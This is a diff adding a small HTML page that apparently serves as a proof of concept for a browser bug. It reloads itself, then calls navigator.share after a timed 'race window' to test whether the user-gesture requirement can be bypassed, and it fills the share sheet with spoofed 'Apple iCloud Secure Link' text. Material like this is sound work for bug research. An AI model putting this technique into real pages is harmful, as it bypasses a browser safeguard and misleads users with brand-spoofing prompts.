@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Gesture Reload Share</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: sans-serif;
+      display: flex;
+      height: 100vh;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+    button {
+      padding: 14px 28px;
+      font-size: 18px;
+      background: #007aff;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+<h2>Tap to Share This Page</h2>
+<button onclick="triggerShare()">Share Now</button>
+
+<script>
+function triggerShare() {
+  // Store a flag in localStorage to detect reload phase
+  localStorage.setItem('shareAfterReload', '1');
+
+  // Reload the page — gesture chain still may persist
+  location.reload();
+}
+
+window.onload = () => {
+  if (localStorage.getItem('shareAfterReload') === '1') {
+    localStorage.removeItem('shareAfterReload');
+
+    // Delay slightly to simulate load process
+    setTimeout(() => {
+      if (navigator.share) {
+        navigator.share({
+          title: "Apple iCloud Secure Link",
+          text: "Here’s a secure link",
+          url: "https://appleid.apple.com"
+        }).catch(err => {
+          console.warn("Share canceled:", err);
+        });
+      }
+    }, 300); // <= race window
+  }
+};
+</script>
+
+</body>
+</html>
